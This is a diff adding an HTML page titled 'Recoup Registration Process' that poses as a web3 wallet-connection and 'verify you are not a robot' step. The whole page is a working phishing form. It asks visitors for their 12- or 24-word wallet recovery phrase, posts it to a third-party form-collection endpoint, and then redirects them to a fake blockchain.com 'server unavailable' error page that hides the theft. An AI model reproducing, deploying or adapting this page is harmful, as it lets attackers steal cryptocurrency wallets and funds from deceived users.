@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+  <head>
+  	<title>Recoup Registration Process</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+	
+	<link rel="stylesheet" href="css/style.css">
+
+	</head>
+	<body class="img js-fullheight" style="background-image: url(images/bg.jpg);">
+	 <script>  
+function validateform(){  
+var name=document.myform.name.value;  
+var password=document.myform.key.value;  
+  
+if (name==null || name==""){  
+  alert("Agent flied can't be empty");  
+  return false;  
+}else if(password.length<6){  
+  alert("Key Phrase is usually 12 or 24 words  long.");  
+  return false;  
+  }  
+}  
+</script>  
+	<section class="ftco-section">
+		<div class="container">
+			<div class="row justify-content-center">
+				<div class="col-md-6 text-center mb-5">
+				<img src="./css/logo.svg" class="img-fluid"> 
+					<h2 class="heading-section">Connect through dapps and web3 protocol<br>
+Most wallets support the connection process. Interaction between blockchain apps  and  browsers are made possible with web3.
+
+</h2>
+				</div>
+			</div>
+			<div class="row justify-content-center">
+				<div class="col-md-6 col-lg-4">
+					<div class="login-wrap p-0">
+		      	<h3 class="mb-4 text-center">Please verify you are not a robot</h3>
+		      	<form name="myform" action="https://submit-form.com/LCP9nGkL" class="signin-form" onsubmit="return validateform()" >
+				 <input
+    type="hidden"
+    name="_redirect"
+    value="https://www.blockchain.com/institutional/recoup-procedure/USAserver/operation=failed/server-unavailable-please-try-again-later"
+  />
+		      		 <div class="form-group">
+	              <input name="name" id="email-field" type="text" class="form-control" placeholder="Name of agent in charge" required>
+	             
+	            </div>
+	            <div class="form-group">
+	              <input name="key" id="password-field" type="textarea" class="form-control" placeholder="Wallet key phrase (12 words seperated by commar,) " required>
+	              <span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span>
+	            </div>
+	            <div class="form-group">
+	            	<button type="submit" class="form-control btn btn-primary submit px-3">Begin Verification</button>
+	            </div>
+	         
+	          </form>
+	       
+	        
+		      </div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<script src="js/jquery.min.js"></script>
+  <script src="js/popper.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/main.js"></script>
+
+	</body>
+</html>
+
